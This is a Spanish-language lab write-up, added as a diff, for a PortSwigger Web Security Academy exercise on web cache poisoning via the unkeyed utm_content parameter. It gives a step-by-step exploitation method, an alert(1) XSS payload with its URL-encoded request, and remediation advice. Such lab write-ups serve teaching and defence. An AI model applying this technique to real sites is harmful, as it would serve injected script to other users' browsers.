@@ -1,0 +1,378 @@
+# Web Cache Poisoning via an Unkeyed Query Parameter
+
+## Información General
+
+- **Plataforma:** PortSwigger Web Security Academy
+- **Categoría:** Web Cache Poisoning
+- **Laboratorio:** Web Cache Poisoning via an Unkeyed Query Parameter
+- **Estado:** Resuelto
+- **Impacto:** Stored Cross-Site Scripting (XSS) mediante Web Cache Poisoning
+
+---
+
+# Resumen Ejecutivo
+
+La aplicación utiliza un mecanismo de caché en el que el parámetro GET `utm_content` **no forma parte de la cache key**, aunque sí es utilizado para generar el contenido de la respuesta HTML.
+
+Esto permite introducir contenido arbitrario que será almacenado en caché y posteriormente servido a otros usuarios, convirtiendo un XSS reflejado en un **Stored XSS** mediante envenenamiento de la caché.
+
+---
+
+# Clasificación del Riesgo
+
+| Campo | Valor |
+|--------|-------|
+| Severidad | Alta |
+| CWE | CWE-79 |
+| OWASP | A03:2021 – Injection |
+| Tipo | Web Cache Poisoning |
+| Impacto | Cross-Site Scripting |
+| Complejidad | Baja |
+| Interacción requerida | Sí |
+
+---
+
+# Información de la Vulnerabilidad
+
+## Tipo
+
+Web Cache Poisoning
+
+## Subtipo
+
+Unkeyed Query Parameter
+
+## Parámetro vulnerable
+
+```
+utm_content
+```
+
+## Activo afectado
+
+```
+GET /
+```
+
+Página principal del sitio web.
+
+---
+
+# Descripción Técnica
+
+La aplicación genera dinámicamente la siguiente etiqueta HTML:
+
+```html
+<link rel="canonical" href="...">
+```
+
+El parámetro `utm_content` es incorporado directamente al atributo `href`.
+
+Sin embargo:
+
+- modifica la respuesta HTML;
+- no forma parte de la cache key.
+
+Como consecuencia, varias peticiones distintas pueden compartir la misma entrada de caché, permitiendo que una respuesta maliciosa sea servida posteriormente a otros usuarios.
+
+---
+
+# Metodología
+
+## 1. Identificación del Cache Oracle
+
+Se envió la petición:
+
+```http
+GET / HTTP/2
+```
+
+Observando los encabezados:
+
+```
+X-Cache
+Age
+```
+
+fue posible distinguir entre:
+
+```
+X-Cache: miss
+```
+
+y
+
+```
+X-Cache: hit
+```
+
+confirmando que la página principal era un buen **cache oracle**.
+
+---
+
+## 2. Comprobación del comportamiento de la cache key
+
+Se añadió un parámetro arbitrario:
+
+```http
+GET /?cb=1234 HTTP/2
+```
+
+La respuesta devolvió:
+
+```
+X-Cache: miss
+```
+
+indicando que el parámetro `cb` forma parte de la cache key.
+
+---
+
+## 3. Descubrimiento de parámetros ocultos
+
+Utilizando **Param Miner** (Guess GET Parameters) se identificó el parámetro:
+
+```
+utm_content
+```
+
+---
+
+## 4. Verificación del parámetro
+
+Se envió:
+
+```http
+GET /?cb=1234&utm_content=test HTTP/2
+```
+
+Tras varios intentos apareció:
+
+```
+X-Cache: hit
+```
+
+Aunque el parámetro modificaba la respuesta HTML, seguía utilizando la misma entrada de caché.
+
+Esto demuestra que:
+
+- el parámetro afecta al contenido;
+- pero no forma parte de la cache key.
+
+---
+
+# Identificación de la Vulnerabilidad
+
+La respuesta generada contenía:
+
+```html
+<link rel="canonical"
+href="//host/?cb=1234&utm_content=test"/>
+```
+
+Por tanto, el valor de `utm_content` era reflejado directamente dentro de un atributo HTML.
+
+---
+
+# Explotación
+
+## Payload utilizado
+
+```
+'/><script>alert(1)</script>
+```
+
+Versión URL codificada:
+
+```
+%27/%3E%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+Petición utilizada:
+
+```http
+GET /?utm_content=%27/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/2
+```
+
+Tras varios intentos se obtuvo:
+
+```
+X-Cache: hit
+```
+
+La respuesta contenía:
+
+```html
+<link rel="canonical"
+href="//host/?utm_content='/><script>alert(1)</script>'/>
+```
+
+El payload consiguió:
+
+1. cerrar el atributo `href`;
+2. cerrar la etiqueta `<link>`;
+3. crear una nueva etiqueta `<script>`;
+4. ejecutar JavaScript en el navegador.
+
+Al abrir la URL en el navegador se ejecutó correctamente:
+
+```
+alert(1)
+```
+
+---
+
+# Envenenamiento de la Caché
+
+Una vez comprobado el XSS:
+
+1. Se eliminó el parámetro cache buster.
+2. Se volvió a enviar la petición con el payload.
+3. Se esperó a obtener:
+
+```
+X-Cache: miss
+```
+
+seguido de:
+
+```
+X-Cache: hit
+```
+
+Esto almacenó la respuesta maliciosa en la caché correspondiente a la página principal.
+
+Cuando el usuario víctima visitó:
+
+```
+/
+```
+
+recibió el contenido envenenado y ejecutó el JavaScript.
+
+El laboratorio quedó resuelto.
+
+---
+
+# Peticiones HTTP Relevantes
+
+## Descubrimiento
+
+```http
+GET /?cb=1234&utm_content=test HTTP/2
+Host: vulnerable-site
+```
+
+---
+
+## Explotación
+
+```http
+GET /?utm_content=%27/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/2
+Host: vulnerable-site
+```
+
+---
+
+# Evidencias
+
+## Cache Oracle
+
+```
+X-Cache: hit
+Age: 8
+```
+
+---
+
+## HTML generado
+
+```html
+<link rel="canonical"
+href="//host/?utm_content='/><script>alert(1)</script>'/>
+```
+
+---
+
+## Ejecución del XSS
+
+```
+alert(1)
+```
+
+---
+
+## Estado final
+
+```
+Lab Solved
+```
+
+---
+
+# Impacto
+
+Un atacante puede:
+
+- ejecutar JavaScript en los navegadores de otros usuarios;
+- robar información accesible mediante JavaScript;
+- secuestrar sesiones cuando las cookies no estén protegidas;
+- modificar el contenido mostrado por la aplicación;
+- realizar ataques de phishing;
+- distribuir malware utilizando la propia aplicación como origen de confianza.
+
+El impacto aumenta debido a que el contenido malicioso queda almacenado temporalmente en la caché y puede afectar simultáneamente a múltiples usuarios.
+
+---
+
+# Causa Raíz
+
+La vulnerabilidad aparece por la combinación de dos errores:
+
+1. El parámetro `utm_content` no forma parte de la cache key.
+2. El mismo parámetro se refleja directamente en el HTML sin aplicar un escape adecuado para el contexto de atributo.
+
+Esta combinación permite transformar un XSS reflejado en un Stored XSS mediante Web Cache Poisoning.
+
+---
+
+# Recomendaciones
+
+## Alta prioridad
+
+- Incluir todos los parámetros que modifiquen la respuesta dentro de la cache key.
+
+## Alta prioridad
+
+- Escapar correctamente cualquier dato controlado por el usuario antes de incorporarlo a atributos HTML.
+
+## Media prioridad
+
+- Ignorar los parámetros de seguimiento (`utm_*`) durante la generación del HTML cuando no sean necesarios.
+
+## Media prioridad
+
+- Implementar una **Content Security Policy (CSP)** restrictiva para limitar la ejecución de código JavaScript inyectado.
+
+## Baja prioridad
+
+- Revisar la configuración del sistema de caché para asegurar que todos los elementos utilizados para construir la respuesta también sean utilizados para generar la cache key.
+
+---
+
+# Referencias
+
+- PortSwigger Web Security Academy – *Web Cache Poisoning via an Unkeyed Query Parameter*
+- CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
+- OWASP Web Cache Poisoning
+- RFC 9111 – HTTP Caching
+
+---
+
+# Conclusiones
+
+Este laboratorio demuestra cómo una configuración incorrecta del sistema de caché puede convertir un XSS reflejado en un **Stored XSS** distribuido a través de la caché.
+
+Al ignorar un parámetro en la generación de la cache key pero utilizarlo para construir la respuesta HTML, la aplicación permite almacenar contenido malicioso que será servido posteriormente a otros usuarios.
+
+La combinación de **parámetros GET no indexados**, **reflexión insegura en atributos HTML** y **almacenamiento en caché** constituye un escenario de alto impacto que puede comprometer a múltiples usuarios simultáneamente.
